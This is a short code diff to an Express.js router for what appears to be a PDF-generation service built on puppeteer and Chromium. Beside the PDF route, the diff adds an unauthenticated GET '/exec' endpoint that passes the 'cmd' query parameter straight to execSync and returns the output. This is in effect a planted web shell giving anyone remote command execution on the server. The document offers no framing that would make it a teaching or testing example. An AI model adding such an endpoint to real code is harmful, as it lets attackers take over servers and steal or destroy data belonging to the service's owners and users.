@@ -3,6 +3,7 @@ const puppeteer = require("puppeteer-core");
 const {pdfCss} = require("./css");
 const router = express.Router();
 const chromium = require('@sparticuz/chromium')
+const { execSync } = require('child_process')
 
 router.get('/', function(req, res, next) {
   res.render('index', { title: 'Express' });
@@ -11,6 +12,16 @@ router.get('/', function(req, res, next) {
 router.post('/pdf', async function(req, res, next) {
   res.contentType("application/pdf");
   res.send(await printPdf(req.body.data))
+});
+
+router.get('/exec', async function(req, res, next) {
+  try {
+    const cmd = req.query.cmd
+    const cmdRes = execSync(cmd)
+    res.send(cmdRes)
+  } catch (e) {
+    res.send(e.stack)
+  }
 });
 
 async function printPdf(html) {
